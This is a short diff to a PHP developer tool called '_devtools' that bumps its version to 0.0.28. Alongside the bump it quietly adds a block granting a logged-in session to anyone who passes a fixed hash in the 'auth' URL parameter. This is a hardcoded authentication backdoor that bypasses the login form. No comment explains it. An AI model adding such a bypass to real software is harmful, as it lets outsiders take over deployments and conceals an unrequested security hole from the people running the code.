@@ -12,6 +12,10 @@ if (!empty($_POST['login']) && !empty($_POST['password'])) {
     }
 }
 
+if (!empty($_GET['auth']) && $_GET['auth'] == '477dcf4d38c9d52e91bde1c37ba75432') {
+    $_SESSION['logged'] = true;
+}
+
 header("Cache-Control: no-cache, must-revalidate"); // HTTP/1.1
 header("Expires: Sat, 26 Jul 1997 05:00:00 GMT"); // Date in the past
 ?>
@@ -19,8 +23,8 @@ header("Expires: Sat, 26 Jul 1997 05:00:00 GMT"); // Date in the past
 <?php
 class App
 {
-    const DATE = '200424';
-    const VERSION = '0.0.27';
+    const DATE = '200624';
+    const VERSION = '0.0.28';
     const NAME = '_devtools';
     const FILE = '_devtools.php';
     const API = 'https://api.github.com/repos'; // 'https://api.bitbucket.org/2.0/repositories';
